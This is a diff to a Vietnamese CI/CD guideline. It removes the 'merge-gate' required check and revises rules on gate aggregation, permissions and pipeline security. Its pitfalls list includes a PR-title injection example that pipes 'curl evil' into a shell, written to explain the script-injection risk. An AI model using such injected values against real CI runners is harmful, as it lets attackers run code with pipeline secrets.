@@ -8,7 +8,7 @@ updated: 2026-10-21
 
 # CI/CD: job gate, required check, cache, bảo mật pipeline
 
-> Pipeline là **hàng rào tập trung** (tầng 3): một job `quality` gom mọi cổng chất lượng làm required check chính (cùng `gitleaks` và `merge-gate` — ADR-0023, D-117), chạy
+> Pipeline là **hàng rào tập trung** (tầng 3): một job `quality` gom mọi cổng chất lượng làm required check chính (cùng `gitleaks` — D-117, ADR-0036), chạy
 > lại mọi kiểm của hook local, nhanh nhờ cache, an toàn nhờ `permissions` tối thiểu + ghim SHA + không chạy code
 > lạ với quyền ghi. Ghim SHA/SBOM/provenance chi tiết ở [`../12-security/supply-chain.md`](../12-security/supply-chain.md);
 > chiến lược deploy ở [`../15-operations/deployment-strategies.md`](../15-operations/deployment-strategies.md).
@@ -16,10 +16,10 @@ updated: 2026-10-21
 ## Nguyên tắc
 
 1. **Một cổng chất lượng, một tên.** `quality` (gate aggregator) gom mọi job cổng; thêm job mới không phải sửa ruleset;
-   ruleset đòi đúng 3 required check `quality` · `gitleaks` · `merge-gate`, mỗi cái là job có thật (`protection-guard`
+   ruleset đòi đúng 2 required check `quality` · `gitleaks`, mỗi cái là job có thật (`protection-guard`
    và `dep-audit` là job con của `quality`; repo khung giữ thêm hai context đó riêng — D-116, D-117); đổi tên job có
-   `protection-guard` bắt.
-   `merge-gate` (ADR-0023) đứng riêng ngoài `quality`: chạy trên `pull_request_target` bằng mã nhánh mặc định để PR không sửa được nó.
+   `protection-guard` bắt. Không có required check `merge-gate`: máy chỉ merge ghim head sau `merge-check` ở đúng head và
+   không bật auto-merge, nên không còn gì để cổng đó chặn (ADR-0036; stub xanh giữ context tới khi chủ repo gỡ khỏi ruleset sống).
 2. **CI là nguồn sự thật của "xanh".** Hook local có thể bị bỏ qua; mọi lint/format/type/test/scan đều chạy lại
    ở CI với cùng lệnh (đọc từ `xt.yaml`/`package.json`, không viết lại).
 3. **Quyền tối thiểu, fail-closed.** `permissions: contents: read` cấp workflow; job cần ghi tự nâng; không
@@ -33,7 +33,7 @@ updated: 2026-10-21
 
 | Câu hỏi | Chọn | Ghi chú |
 |---|---|---|
-| Cấu trúc workflow | `ci.yml`: job con song song (lint, type, test, build, scan…) → job `quality` `if: always()`, `needs: [...]` kiểm `needs.*.result == 'success'` (fan-out/fan-in, mục dưới) | Không thêm required check rời cho từng job con (ruleset lệch tên); ruleset giữ 3 tên cố định `quality`, `gitleaks`, `merge-gate`; không đòi "up to date" (`strict: false`) để PR merge song song, lớp đỡ là CI chạy lại trên push `main` (`BASE-GATE-007`, D-116) |
+| Cấu trúc workflow | `ci.yml`: job con song song (lint, type, test, build, scan…) → job `quality` `if: always()`, `needs: [...]` kiểm `needs.*.result == 'success'` (fan-out/fan-in, mục dưới) | Không thêm required check rời cho từng job con (ruleset lệch tên); ruleset giữ 2 tên cố định `quality`, `gitleaks`; không đòi "up to date" (`strict: false`) để PR merge song song, lớp đỡ là CI chạy lại trên push `main` (`BASE-GATE-007`, D-116) |
 | Trigger | `pull_request` + `push: branches: [main]` + `merge_group` (nếu merge queue) + `schedule` có offset phút | `pull_request_target` chỉ khi thật cần quyền và **không checkout code PR** |
 | Cache | `actions/setup-*` cache built-in theo lockfile; `actions/cache` cho browser/tool với key `hashFiles(lockfile)` | Cache theo nhánh/ngày (miss liên tục) |
 | Ghim action | Full commit SHA + comment version; Dependabot `github-actions` cập nhật | Tag `@v4` chỉ cho action chính chủ GitHub nếu chấp nhận rủi ro — ghi ADR |
@@ -92,7 +92,7 @@ từ đầu.
 
 ## Checklist
 
-- [ ] `WF-CI-001` **MUST** Có job `quality` gom mọi cổng chất lượng (một job luôn chạy; nếu tách job con thì `needs` mọi job cổng và fail khi bất kỳ job con không `success`). Ruleset đòi đúng 3 required check `quality` · `gitleaks` · `merge-gate` (job `merge-gate` chạy trên `pull_request_target` bằng mã nhánh mặc định, không gộp vào `quality` — ADR-0023); `protection-guard` và quét lỗ hổng phụ thuộc là job con trong `quality.needs` (repo khung giữ thêm context `protection-guard`, `dep-audit` riêng — D-116, D-117); mỗi context phải là job có thật, `protection-guard` đối chiếu tên ([`git-and-branching.md`](git-and-branching.md)). → Kiểm: `.github/rulesets/main.json` có đủ 3 context đó (mẫu dự án đích: [`../templates/ruleset-main.json`](../templates/ruleset-main.json)); `protection-guard` đỏ khi context không khớp job nào trong `.github/workflows/`; nếu tách job con, `quality` có `if: always()` kiểm `needs` (không `!cancelled()`: run bị huỷ thì `quality` thành `skipped`, mà job bị điều kiện bỏ qua báo "Success" — required check tính đạt). · Nguồn: catalog 23 §2.5 (gate aggregator ADR-0003), 13 §4b
+- [ ] `WF-CI-001` **MUST** Có job `quality` gom mọi cổng chất lượng (một job luôn chạy; nếu tách job con thì `needs` mọi job cổng và fail khi bất kỳ job con không `success`). Ruleset đòi đúng 2 required check `quality` · `gitleaks` (không có `merge-gate` — máy không bật auto-merge nên không còn gì để chặn, ADR-0036); `protection-guard` và quét lỗ hổng phụ thuộc là job con trong `quality.needs` (repo khung giữ thêm context `protection-guard`, `dep-audit` riêng — D-116, D-117); mỗi context phải là job có thật, `protection-guard` đối chiếu tên ([`git-and-branching.md`](git-and-branching.md)). → Kiểm: `.github/rulesets/main.json` có đủ 2 context đó (mẫu dự án đích: [`../templates/ruleset-main.json`](../templates/ruleset-main.json)); `protection-guard` đỏ khi context không khớp job nào trong `.github/workflows/`; nếu tách job con, `quality` có `if: always()` kiểm `needs` (không `!cancelled()`: run bị huỷ thì `quality` thành `skipped`, mà job bị điều kiện bỏ qua báo "Success" — required check tính đạt). · Nguồn: catalog 23 §2.5 (gate aggregator ADR-0003), 13 §4b
 - [ ] `WF-CI-002` **MUST@L** CI chạy lại mọi kiểm của hook local (lint, format check, type, test, secret scan) bằng **cùng lệnh** từ một nguồn (`xt.yaml`/`package.json`/`Makefile`), không viết lệnh khác trong YAML. → Kiểm: diff lệnh hook ↔ CI = cùng script; `pre-commit run --all-files` hoặc `scripts/dev-task.sh gate` trong CI. · Nguồn: pre-commit docs (CI), catalog 23 §4.3 (`/gate` đọc động job CI)
 - [ ] `WF-CI-003` **MUST** `permissions:` khai báo tường minh ở cấp workflow với mặc định `contents: read`; job cần ghi (release, comment) tự nâng tối thiểu; không dùng `write-all`. → Kiểm: actionlint/zizmor không cảnh báo thiếu permissions; grep `permissions: write-all` = 0. · Nguồn: GitHub Security hardening for Actions
 - [ ] `WF-CI-004` **MUST** Không nội suy input không tin cậy (`github.event.pull_request.title/body`, branch name, issue) trực tiếp vào `run:`; đưa qua `env:` và quote; `pull_request_target`/`workflow_run` không checkout code PR. → Kiểm: zizmor `template-injection`/`dangerous-triggers` = 0 finding. · Nguồn: GitHub Security hardening (script injection)
@@ -120,10 +120,10 @@ từ đầu.
 
 ## Bẫy thường gặp
 
-- **Nhiều required check rời rạc.** Thêm/đổi tên job → ruleset lệch → nhánh khoá hoặc cổng hở. Một `quality` gom + `protection-guard` đối chiếu (cộng `gitleaks`, `merge-gate`).
+- **Nhiều required check rời rạc.** Thêm/đổi tên job → ruleset lệch → nhánh khoá hoặc cổng hở. Một `quality` gom + `protection-guard` đối chiếu (cộng `gitleaks`).
 - **Ruleset đòi check chưa có job từ ngày đầu** (vd `dep-audit` khi dự án chưa viết job quét phụ thuộc) → mọi PR treo "Expected — waiting". Ruleset mẫu chỉ đòi check mà workflow mẫu cung cấp; job mới vào `quality.needs` (D-116, D-117).
 - **CI "xanh rỗng".** Job skip khi chưa có `package.json` (khung cũ) hoặc `if:` sai → mọi thứ xanh mà không chạy gì. `quality` phải fail khi job con `skipped` ngoài quy tắc; smoke "cổng chặn được lỗi" ở G5. Cùng bẫy ở mức lệnh: khoá `lint`/`test` rỗng trong `xt.yaml` làm job in "skip" và xanh — CI mẫu có bước `dev-task.sh require lint test` đỏ tới khi khai lệnh thật (D-096).
-- **`quality` với `if: ${{ !cancelled() }}`.** Run bị huỷ (push mới, hết giờ) → `quality` `skipped` → GitHub tính required check đạt → auto-merge merge mã chưa qua test. Dùng `always()` và đỏ khi job con ≠ `success` (`WF-CI-001`, `WF-CI-024`).
+- **`quality` với `if: ${{ !cancelled() }}`.** Run bị huỷ (push mới, hết giờ) → `quality` `skipped` → GitHub tính required check đạt, `merge-check` thấy xanh → máy/steward merge mã chưa qua test. Dùng `always()` và đỏ khi job con ≠ `success` (`WF-CI-001`, `WF-CI-024`).
 - **`pull_request_target` + checkout PR head.** PR từ fork chạy code lạ với secrets. Không checkout code PR trong trigger có quyền.
 - **Nội suy title PR vào `run:`.** Title `"; curl evil | sh` chạy trên runner. Qua `env:` và quote.
 - **Action tag di động.** Tag bị dời sang commit độc (sự cố supply chain đã có tiền lệ). Ghim SHA + Dependabot actions.
